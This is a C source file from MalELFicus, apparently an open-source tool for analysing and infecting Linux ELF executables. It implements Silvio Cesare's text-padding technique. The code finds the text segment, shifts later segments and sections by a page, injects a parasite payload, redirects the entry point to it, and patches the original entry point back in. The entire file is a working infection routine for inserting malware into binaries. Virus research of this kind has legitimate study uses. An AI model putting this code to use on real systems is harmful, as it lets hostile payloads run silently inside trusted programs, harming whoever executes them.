/*
  Malelficus
  --------

  MalELFicus is a malefic tool for dissect and infect ELF binaries.
  Please do not be malefic to use this tool. ;)

  Author: Tiago Natel de Moura <tiago4orion@gmail.com>

  Copyright 2012 by Tiago Natel de Moura. All Rights Reserved.

  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.


*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include "malelf/infect.h"
#include "malelf/util.h"
#include "malelf/error.h"
#include "malelf/object.h"

#define PAGE_SIZE 4096

/**
 * Try to infect the ELF using the text padding technique created
 * by Silvio Cesare.
 * More information: http://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt
 */
_u8 malelf_infect_silvio_padding(malelf_object* input,
                                  malelf_object* output,
                                  malelf_object* parasite,
                                 _u32 offset_entry_point,
                                 unsigned long int magic_bytes) {
    int i;
    _i32 error = MALELF_SUCCESS;
    char text_found;
    malelf_elf_t *ielf;
    ElfW(Ehdr) *ehdr;
    ElfW(Shdr) *shdr;
    ElfW(Phdr) *phdr;

    unsigned int after_insertion_offset = 0;
    unsigned int end_of_text = 0;
    unsigned long int old_e_entry = 0;
    unsigned long parasite_vaddr = 0;
    unsigned long text = 0;

    text_found = 0;

    ielf = &input->elf;
    ehdr = ielf->elfh;
    phdr = ielf->elfp;
    shdr = ielf->elfs;

    for (i = ehdr->e_phnum; i-- > 0; phdr++) {	 
        if (text_found) {
          /* shift every segment after the text segment by PAGE_SIZE */
            phdr->p_offset += PAGE_SIZE;
            continue;
        }
        else {
            if(phdr->p_type == PT_LOAD) { 
                /* TEXT SEGMENT */
                if (phdr->p_flags == (PF_R | PF_X)) {
                    text = phdr->p_vaddr;
                    parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;

                    /* save old entry point to jmp too later */
                    /* and patch entry point to our new entry */
                    old_e_entry = ehdr->e_entry;
                    ehdr->e_entry = parasite_vaddr;
		  	
                    end_of_text = phdr->p_offset + phdr->p_filesz;
	 	 
                    /* increase memsz and filesz */
                    phdr->p_filesz += parasite->st_info.st_size;
                    phdr->p_memsz += parasite->st_info.st_size;
		
                    /* same thing */	
                    after_insertion_offset = phdr->p_offset + phdr->p_filesz;
                    text_found++;
                }
            }
        }
    }

    if (old_e_entry == 0 || after_insertion_offset == 0) {
        LOG_ERROR("Failed to get old entry point...\n");
        exit(-1);
    }
	
    /* increase size of any section that resides after injection by page size */

    for (i = ehdr->e_shnum; i-- > 0; shdr++) {
        if (shdr->sh_offset >= after_insertion_offset)
            shdr->sh_offset += PAGE_SIZE;
        else
            if (shdr->sh_size + shdr->sh_addr == parasite_vaddr)
                shdr->sh_size += parasite->st_info.st_size;

    }
	 	
    if (!text) {
        LOG_ERROR("Could not locate text segment, exiting\n");
        exit(-1);
    }

    LOG_SUCCESS("Text segment starts at 0x%08x\n", (unsigned int) text);
    LOG_SUCCESS("Patched entry point from 0x%x to 0x%x\n", (unsigned)old_e_entry, (unsigned)ehdr->e_entry);
    LOG_SUCCESS("Inserting parasite at offset %x vaddr 0x%x\n", (unsigned)end_of_text, (unsigned)parasite_vaddr);

    ehdr->e_shoff += PAGE_SIZE;
    error = _malelf_parasite_silvio_padding(input, output, end_of_text, parasite, offset_entry_point, old_e_entry, magic_bytes);
    
    
    malelf_close(input);

    return error;
}

_u8 _malelf_parasite_silvio_padding(malelf_object* input,
                                    malelf_object* output,
                                    unsigned int end_of_text,
                                    malelf_object* parasite,
                                     _u32 offset_entry_point,
                                    unsigned old_e_entry,
                                    unsigned long int magic_bytes) {
    _u8 error;
    unsigned int c, i;
    char *parasite_data = (char*)parasite->mem;
    union malelf_dword magic_addr;

    if (magic_bytes == 0) {
        magic_addr.long_val = MALELF_MAGIC_BYTES;
    } else {
        magic_addr.long_val = magic_bytes;
    }
	
    LOG_SUCCESS("Inserting parasite\n");
    
    if ((error = malelf_openw(output, output->fname)) != MALELF_SUCCESS) {
        LOG_ERROR("Failed to open file '%s' for write.\n", output->fname);
        exit(-1);
    }

    if ((c = write(output->fd, input->mem, end_of_text)) != end_of_text) {
        perror("write");
        exit(-1);
    }

    if (offset_entry_point == 0) {
      int curSearch = 0;
      i = 0;
      while(i <= (unsigned)parasite->st_info.st_size) {
        unsigned hex = parasite_data[i];

        if(hex == magic_addr.char_val[curSearch]) { /* found a match */
          curSearch++;                        /* search for next hex */
          if(curSearch > 3) {                 /* found the whole magic number */
            offset_entry_point = i - 3;
            LOG_SUCCESS("Magic number found at '%d' bytes of malware\n", offset_entry_point);
            break;
          }
        } else { 
          curSearch = 0;                     /* go back, search for first char */
        }

        i++;
      }
    }

    if (offset_entry_point == 0) {
        LOG_ERROR("Failed to find magic bytes in malware...\n");
        return MALELF_EMISSING_MAGIC_BYTES;
    }

    if (offset_entry_point < (unsigned) parasite->st_info.st_size) {
        *(unsigned *)&parasite_data[offset_entry_point] = old_e_entry;
    } else {
      LOG_ERROR("Invalid return offset for entry point in malware ...\n");
      return MALELF_EINV_OFFSET_ENTRY;
    }
	
    if ((c = write(output->fd, parasite_data, parasite->st_info.st_size)) != (unsigned)parasite->st_info.st_size) {
        perror("write");
        exit(-1);
    }
 	
    if((c = lseek(output->fd, PAGE_SIZE - parasite->st_info.st_size, SEEK_CUR)) != end_of_text + PAGE_SIZE) {
        perror("lseek");
        exit(-1);
    }

    input->mem += end_of_text;

    /* unsigned int sum = end_of_text + PAGE_SIZE; */
    unsigned int last_chunk = input->st_info.st_size - end_of_text;
	
    if ((c = write(output->fd, input->mem, last_chunk)) != last_chunk) {
        perror("write");
        exit(-1);
    }

    LOG_SUCCESS("Successfully infected: %s\n", output->fname);

    return MALELF_SUCCESS;
}

